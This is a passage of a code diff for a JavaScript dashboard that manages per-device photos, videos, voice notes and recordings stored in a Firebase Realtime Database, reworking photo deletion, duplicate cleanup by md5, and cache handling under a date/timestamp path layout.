-    const cb = w.querySelector('.photo-select input');
-    if (cb) cb.checked = selecting;
-    if (selecting) selectedPhotoKeys.add(w.dataset.photokey);
-  });
+  if (selecting) all.forEach(k => selectedPhotoKeys.add(k));
   this.textContent = selecting ? '\u{1F4CB} Deselect All' : '\u{1F4CB} Select All';
-  document.getElementById('btnDeleteSelectedPhotos').textContent = '\u{1F5D1} Delete Selected' + (selectedPhotoKeys.size ? ' (' + selectedPhotoKeys.size + ')' : '');
+  updatePhotoSelectionUI();
+  renderPhotosFromCache();
 });
+
+async function deletePhotoRTDB(date, ts) {
+  try {
+    const ok = await deleteRTDB(`devices/${selectedDevice}/photos/${date}/${ts}`);
+    if (!ok) return false;
+    const sub = await fetchRTDB(`devices/${selectedDevice}/photos/${date}`, 'shallow=true');
+    if (!sub || typeof sub !== 'object' || !Object.keys(sub).length) {
+      return await deleteRTDB(`devices/${selectedDevice}/photos/${date}`);
+    }
+    return true;
+  } catch { return false; }
+}
 
 async function deleteSelectedPhotos() {
   if (!selectedPhotoKeys.size) { showAlert('No photos selected', 'error'); return; }
   if (!confirm('Delete ' + selectedPhotoKeys.size + ' selected photos from RTDB?\nThis cannot be undone.')) return;
-  let deleted = 0;
-  for (const key of selectedPhotoKeys) {
-    if (await deleteRTDB(`devices/${selectedDevice}/photos/${key}`)) deleted++;
+  let deleted = 0, failed = 0;
+  for (const key of [...selectedPhotoKeys]) {
+    const slash = key.indexOf('/');
+    const date = key.slice(0, slash), ts = key.slice(slash + 1);
+    if (await deletePhotoRTDB(date, ts)) {
+      deleted++;
+      delete cachedPhotos[key];
+    } else failed++;
   }
   selectedPhotoKeys.clear();
-  document.getElementById('btnDeleteSelectedPhotos').textContent = '\u{1F5D1} Delete Selected';
-  document.getElementById('btnSelectAllPhotos').textContent = '\u{1F4CB} Select All';
-  cachedPhotos = {};
-  await loadPhotos();
+  await syncPhotoIndex();
   renderPhotosFromCache();
-  showAlert('Deleted ' + deleted + ' photos', deleted > 0 ? 'warn' : 'error');
-}
-
-async function loadMorePhotos() {
-  if (photoLoading || !photoKeys.length || photoOffset >= photoKeys.length) return;
-  photoLoading = true;
-  const batch = photoKeys.slice(photoOffset, photoOffset + PHOTO_BATCH);
-  const lmContainer = document.getElementById('loadMoreContainer');
-  lmContainer.innerHTML = '<div class="load-more-btn" disabled>&#x23F3; Loading...</div>';
-
-  const keys = Object.keys(cachedPhotos);
-  if (keys.length > 500) {
-    const toRemove = keys.sort().slice(0, keys.length - 500);
-    toRemove.forEach(k => delete cachedPhotos[k]);
-  }
-  for (const ts of batch) {
-    if (cachedPhotos[ts]) continue;
-    try {
-      const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
-      if (doc && doc.data && doc.data.startsWith('/9j/')) {
-        cachedPhotos[ts] = doc;
-        if (Object.keys(cachedPhotos).length > 500) break;
-      }
-    } catch {}
-  }
-  photoOffset += batch.length;
-  photoLoading = false;
-  renderPhotosFromCache();
-}
-
-async function loadPhotos() {
-  if (!selectedDevice) return;
-  const grid = document.getElementById('photoGrid');
-  const lmContainer = document.getElementById('loadMoreContainer');
-  grid.innerHTML = '<div class="label" style="margin:20px 0;color:var(--accent)">&#x23F3; Loading photo list...</div>';
-  if (lmContainer) lmContainer.innerHTML = '';
-
-  const keys = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
-  if (!keys || typeof keys !== 'object') {
-    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; No photos yet</div>';
-    photoKeys = [];
-    photoOffset = 0;
-    return;
-  }
-
-  photoKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
-  photoOffset = 0;
-
-  // Filter out already cached keys
-  const freshKeys = photoKeys.filter(k => !cachedPhotos[k]);
-  if (freshKeys.length === 0) {
-    renderPhotosFromCache();
-    return;
-  }
-
-  photoLoading = false;
-  await loadMorePhotos();
-}
-
-async function pollPhotos() {
-  if (!selectedDevice) return;
-  await loadPhotos();
-}
-
-async function loadAllPhotos() {
-  if (!selectedDevice || !photoKeys.length) { await pollPhotos(); return; }
-  photoLoading = false;
-  while (photoOffset < photoKeys.length) {
-    await loadMorePhotos();
-    await new Promise(r => setTimeout(r, 10));
-  }
+  updatePhotoSelectionUI();
+  showAlert('Deleted ' + deleted + ' photos' + (failed ? ', failed ' + failed : ''), deleted > 0 ? 'warn' : 'error');
 }
 
 function openPhotoLightbox(el) {
@@ -4134,32 +4358,36 @@ async function execCleanup(action, path) {
     showAlert('Scanning photo duplicates...', 'warn');
     const keys = await fetchRTDB(`${base}/photos`, 'shallow=true');
     if (!keys || typeof keys !== 'object') { showAlert('No photos found', 'error'); return; }
-    const allKeys = Object.keys(keys).sort((a, b) => parseInt(b) - parseInt(a));
+    const dates = Object.keys(keys).filter(d => !d.startsWith('_'));
+    const allPaths = [];
+    for (const date of dates) {
+      const sub = await fetchRTDB(`${base}/photos/${date}`, 'shallow=true');
+      if (!sub || typeof sub !== 'object') continue;
+      for (const ts of Object.keys(sub)) allPaths.push(`${date}/${ts}`);
+    }
     const groups = {};
     let scanned = 0;
-    for (const k of allKeys) {
-      const doc = await fetchRTDB(`${base}/photos/${k}`);
+    for (const path of allPaths) {
+      const doc = await fetchRTDB(`${base}/photos/${path}`);
       if (doc && doc.fileName) {
-        const gk = doc.fileName + '|' + (doc.dateTaken || '');
+        const gk = doc.md5 || (doc.fileName + '|' + (doc.dateTaken || ''));
         if (!groups[gk]) groups[gk] = [];
-        groups[gk].push({ key: k, size: (doc.data || '').length });
+        groups[gk].push({ path, size: (doc.data || '').length });
       }
       scanned++;
-      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning photo ${scanned}/${allKeys.length}...</div>`;
+      if (scanned % 10 === 0) document.getElementById('storageOverview').innerHTML = `<div class="label">Scanning photo ${scanned}/${allPaths.length}...</div>`;
     }
     let deleted = 0, freed = 0;
     for (const [gk, entries] of Object.entries(groups)) {
       if (entries.length <= 1) continue;
       entries.sort((a, b) => b.size - a.size);
       for (let i = 1; i < entries.length; i++) {
-        const ok = await deleteRTDB(`${base}/photos/${entries[i].key}`);
+        const ok = await deleteRTDB(`${base}/photos/${entries[i].path}`);
         if (ok) { deleted++; freed += entries[i].size; }
       }
     }
-    // Clear cache and reload
-    cachedPhotos = {};
-    await loadPhotos();
-    renderPhotosFromCache();
+    clearPhotoCache();
+    await pollPhotos();
     await refreshStorage();
     showAlert(`Deleted ${deleted} duplicate photos (freed ${formatBytes(freed)})`, deleted > 0 ? 'warn' : 'error');
     return;
@@ -4221,7 +4449,8 @@ async function execCleanup(action, path) {
     if (!confirm(`Delete ALL ${path} data?\nThis cannot be undone.`)) return;
     const ok = await deleteRTDB(fullPath);
     if (ok) {
-      if (path === 'photos') { cachedPhotos = {}; renderPhotosFromCache(); }
+      if (path === 'photos') { clearPhotoCache(); renderPhotosFromCache(); }
+      if (path === 'videos') { clearVideoCache(); renderVideosFromCache(); }
       if (path === 'voice_notes') { clearVoiceCache(); renderVoiceNotes(); }
       if (path === 'recordings') { clearRecordingsCache(); renderRemoteRecordings(); }
       showAlert(`Deleted all ${path} data`, 'warn');
@@ -4321,12 +4550,9 @@ async function execCleanup(action, path) {
   }
   if (action === 'clearPhotoCache') {
     if (!confirm('Clear local photo dedup cache?\nThis will re-scan all photos on next sync (may re-upload duplicates).')) return;
-    cachedPhotos = {};
-    photoKeys = [];
-    photoOffset = 0;
+    clearPhotoCache();
     showAlert('Photo cache cleared — next sync will re-scan all photos', 'warn');
-    await loadPhotos();
-    renderPhotosFromCache();
+    await pollPhotos();
     await refreshStorage();
     return;
   }
@@ -4347,7 +4573,8 @@ async function execCleanup(action, path) {
     const ok = await deleteRTDB(base);
     if (ok) {
       showAlert('All device data deleted from RTDB', 'warn');
-      cachedPhotos = {}; renderPhotosFromCache();
+      clearPhotoCache(); clearVoiceCache(); clearRecordingsCache(); clearVideoCache();
+      renderPhotosFromCache(); renderVoiceNotes(); renderRemoteRecordings(); renderVideosFromCache();
       document.getElementById('storageOverview').innerHTML = '<div class="label">All data deleted</div>';
       document.getElementById('cleanupActions').innerHTML = '<div class="label">No data to clean</div>';
     } else {
